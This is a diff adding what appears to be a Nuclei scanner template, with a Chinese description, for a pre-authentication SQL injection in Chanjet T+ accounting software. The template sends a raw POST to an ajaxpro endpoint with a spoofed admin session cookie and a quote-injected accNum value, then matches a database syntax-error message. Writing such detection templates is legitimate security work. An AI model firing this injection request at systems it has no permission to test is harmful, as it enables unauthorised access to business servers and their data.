@@ -1,0 +1,24 @@
+id: chanjettplus-sqli
+
+info:
+  name: 畅捷通T+ (v13,v16) 前台SQL注入漏洞
+  author: pork
+  severity: critical
+  description: |
+    用友 畅捷通T+ Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx处存在SQL注入，该接口未对用户输入进行过滤，导致攻击者可绕过认证进行注入攻击，可得到到服务器敏感数据从而进一步获取控制器。 
+  tags: yonyou,chanjet,TPlus,sqli
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin
+
+        {"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+    matchers:
+      - type: word
+        words:
+          - "附近有语法错误"
+        part: body
